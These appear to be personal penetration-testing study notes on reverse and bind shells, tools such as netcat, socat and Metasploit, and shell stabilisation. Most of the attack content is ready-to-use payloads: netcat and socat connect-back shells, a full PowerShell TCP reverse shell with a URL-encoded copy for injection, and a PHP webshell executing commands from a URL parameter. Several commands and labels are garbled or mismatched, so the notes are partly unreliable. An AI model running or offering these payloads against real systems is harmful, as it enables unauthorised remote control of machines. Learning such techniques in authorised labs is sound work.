Shells are what we use when interfacing with a Command Line Environment (CLI). Examples include `sh` or `bash` in Linux, and `cmd.exe` or `powershell` in Windows.

## Types of Shell
2 types of shells:
- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer.
	- :FasCirclePlus: Good way to bypass firewall prevent that pervent connecting to arbitrary ports on the target.
	- :FasCircleMinus: Need to configure own network to accept the remote shell.
- **Bind shells** are when the code executed on the target is used [[Upgrade shell to meterpreter]]to start a listener attached to a shell directly on the target. Opposite pros and cons of the reverse shells.

_Reverse shell example:_
![[Pasted image 20251014132221.png|center]]

_Bind shell example:_
![[Pasted image 20251014132422.png|center]]

---

Shells can be interactive or non-interactive:
- **Interactive:** Allow you to interact with programs after executing them.	![[Pasted image 20251014132536.png|center]]
- **Non-Interactive:** limited to using programs which do not require user interaction in order to run properly. The majority of simple reverse and bind shells are non-interactive.
	![[Pasted image 20251014132701.png|center|450]]

## Tools
### Netcat
The “Swiss Army Knife” of networking. It is used to manually perform all kind of network interactions including banner grabbing during enumeration. It can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system.

### Socat
Netcat on steroids, but it has to big catches:
- :FasCircleMinus: The syntax is more difficult
- :FasCircleMinus: Netcat is installed in almost every Linux distribution by default. Socat is very rarely installed by default.

There are work arounds to both of these problems.

Both Socat and Netcat have .exe versions for use on Windows.

### Metasploit -- multi/handler

> See [[Metasploit]] and [[Meterpreter]] notes

The `exploit/multi/handler` module of Metasploit is used to receive reverse shells.
- :FasCirclePlus: Provides a fully-fledged way to obtain stable shells.
Is the only way to interact with a _meterpreter_ shell,and is the easiest way to handle _staged_ payloads.

> See [[Upgrade shell to meterpreter]]
### Msfvenom:

> See [[Msfvenom]] notes

Is technically part of Metasploit, however, it is shipped as standalone tool. It is used to generate payloads on the fly. It can generate other payloads other than reverse and bind shells.

### Others:
- [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [SecLists repo](https://github.com/danielmiessler/SecLists): though primarily used for wordlists, also contains some very useful code for obtaining shells.

## Shell Stabilisation
### Technique 1: Python
Requirements (target system):
- Python

```sh
python -c 'import pty; pty.spawn("/bin/bash")' # replace with python2 or python3 as required
export TERM=xterm # will give access to term commands such as clear

Ctrl + Z # Background the session

# Back in our terminal
ssty raw -echo; fg # gives two things: first, turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). Second, foregrounds the shell, completing the process
```

> [!NOTE]
> If the shell dies, any input in our own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

### Technique 2: rlwrap
Rlwrap is a program that gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. However, _some_ manual stabilisation must still be utilised to be able to use Ctrl + C inside the shell.

> Rlwrap is not installed by default on kali. Install with `sudo apt install rlwrap`

```sh
rlwrap nc -lvnp <port>
```

> This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.

### Technique 3: Socat

> Limited to Linux targets. Well, as Socat shell on Windows will be no more stable than a netcat shell.

1. Transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to the target machine.

```sh
# Local machine
sudo python -m http.server 80 # In the directory where the binary is located

# Target machine
wget <LOCAL-IP>/socat -O /tmp/socat
```

#### Reverse shells

Basic reverse shell listener:

```sh
socat TCP-L:<port> -
```

> The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

The equivalent to `stty raw -echo; fg` trick but being immediately stable and hooking into a full tty:

```sh
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

Complete

To connect back on Linux target:

```sh
socat TCP:<LOCAL-IP>-<LOCAL-PORT> exec:"bash -li"
```

To connect back on Windows target:

```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

> The pipes option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

#### Bind shells

On a Linux target we would use the following command:

```shell
socat tcp-l:<PORT> exec:"bash -li"
```

Or fully interactive:

```sh
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Where:
- `pty`, allocates a pseudoterminal on the target -- part of the stabilisation process
- `stderr`, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- `sigint`, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- `setsid`, creates the process in a new session
- `sane`, stabilises the terminal, attempting to "normalise" it.

On a Windows target:

```shell
socat tcp-l:<PORT> exec:powershell.exe,pipes
```

Regardless of the target, to connect to the waiting listener:

```sh
socat tcp:<TARGET-IP>:<TARGET-PORT> -
```

---

## Adjust the Terminal Size
After any of the above techniques (nc, rlwrap, socat), adjust the terminal tty size.

```sh
# In another terminal (of our system):
stty -a # Copy <rows> and <columns>

# Back in the stabilised terminal
stty rows <rows> cols <columns>
```

## Common Shell Payloads
Listener for a bind shell in windows:

```sh
nc -lvnp <PORT> -e /bin/bash
```

_The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._

To send a reverse shell:

```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

For a modern Windows Server, a PSH one-liner:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0.|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## WebShells
A script that runs inside a websever which executes code on the server.

PHP one-liner webshell:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

![[W19gHwL.png]]

> See PentestMonkey [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Windows URL Encoded Powershell Reverse Shell (injected as a value for the vulnerable parameter of the webshell):

```sh
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200.%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```